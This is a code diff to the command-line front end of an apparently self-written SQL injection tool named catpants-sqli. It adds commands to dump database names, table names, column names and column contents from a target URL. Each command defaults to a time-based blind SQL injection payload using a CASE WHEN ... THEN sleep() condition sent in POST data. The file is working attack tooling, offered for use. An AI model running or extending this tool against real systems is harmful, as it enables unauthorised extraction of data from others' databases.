@@ -7,35 +7,66 @@ program
     .description('CLI for catpants-sqli')
     .version('0.0.0');
 
-// program
-//     .requiredOption('-u, --url <URL>', 'URL')
-//     .option('-t, --type <type>', 'type', 'conditional')
-//     .option('-c, --command <command>', 'command', 'dbs')
-//     .option('-X, --method <method>', 'method', 'POST')
-//     .option('-d, --data <data>', 'data')
-//     .action((options) => {
-//         const sqli = new SQLi(options.url, options.type, options.method, options.data);
-
-//         if (options.command === 'dbs') {
-//             sqli.dumpDbs()
-//         } else {
-//             console.log(`Unknown command: ${options.command}`)
-//         }
-//     });
-
-program.command('dump-dbs')
+program.command('dump-db-names')
     .description('Dump database names')
     .requiredOption('-u, --url <URL>', 'URL')
-    .requiredOption('-d, --data <data>', 'data')
+    .option(
+        '-d, --data <data>',
+        'request data',
+        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
     .option('-t, --type <type>', 'type', 'blind')
     .option('-X, --method <method>', 'method', 'POST')
     .option('--timeout <timeout>', 'timeout', 1)
-    .option(
-        '-q, --query <query>',
-        'Query template',
-        '\' AND (CASE WHEN CATPANTS THEN sleep(%i) END)-- -')
     .action((options) => {
-        SQLi.dumpDbs(options)
+        SQLi.dumpDbNames(options)
+    });
+
+program.command('dump-table-names')
+    .description('Dump database tables\' names')
+    .requiredOption('-u, --url <URL>', 'URL')
+    .requiredOption('--db <db>', 'database name')
+    .option(
+        '-d, --data <data>',
+        'request data',
+        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
+    .option('-t, --type <type>', 'type', 'blind')
+    .option('-X, --method <method>', 'method', 'POST')
+    .option('--timeout <timeout>', 'timeout', 1)
+    .action((options) => {
+        SQLi.dumpTableNames(options)
+    });
+
+program.command('dump-column-names')
+    .description('Dump table\'s columns\' names')
+    .requiredOption('-u, --url <URL>', 'URL')
+    .requiredOption('--db <db>', 'database name')
+    .requiredOption('--table <table>', 'table name')
+    .option(
+        '-d, --data <data>',
+        'request data',
+        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
+    .option('-t, --type <type>', 'type', 'blind')
+    .option('-X, --method <method>', 'method', 'POST')
+    .option('--timeout <timeout>', 'timeout', 1)
+    .action((options) => {
+        SQLi.dumpColumnNames(options)
+    });
+
+program.command('dump-table-column')
+    .description('Dump table\'s columns')
+    .requiredOption('-u, --url <URL>', 'URL')
+    .requiredOption('--db <db>', 'database name')
+    .requiredOption('--table <table>', 'table name')
+    .requiredOption('--column <column>', 'column name')
+    .option(
+        '-d, --data <data>',
+        'request data',
+        'name=1\' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -')
+    .option('-t, --type <type>', 'type', 'blind')
+    .option('-X, --method <method>', 'method', 'POST')
+    .option('--timeout <timeout>', 'timeout', 1)
+    .action((options) => {
+        SQLi.dumpTableColumn(options)
     });
 
 program.parse();
